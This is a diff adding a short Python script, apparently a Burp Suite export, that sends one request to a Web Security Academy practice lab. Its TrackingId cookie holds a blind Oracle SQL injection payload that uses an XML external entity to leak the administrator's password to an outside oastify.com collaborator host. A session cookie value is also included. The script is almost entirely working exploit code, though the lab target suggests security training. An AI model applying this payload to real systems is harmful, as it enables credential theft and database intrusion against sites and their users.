@@ -1,0 +1,7 @@
+
+import requests
+
+burp0_url = "https://0adf0029047fccb180884edc004a00dd.web-security-academy.net:443/"
+burp0_cookies = {"TrackingId": "ur6mEWscQMDwWimP'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.738fipwlvx73h5amrvcms617fylp9fx4.oastify.com/\">+%25remote%3b]>'),'/l')+FROM+dual--", "session": "81Maa3u06cthRuglFtonrHvA0MELakkN"}
+burp0_headers = {"Sec-Ch-Ua": "\"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0adf0029047fccb180884edc004a00dd.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
+requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
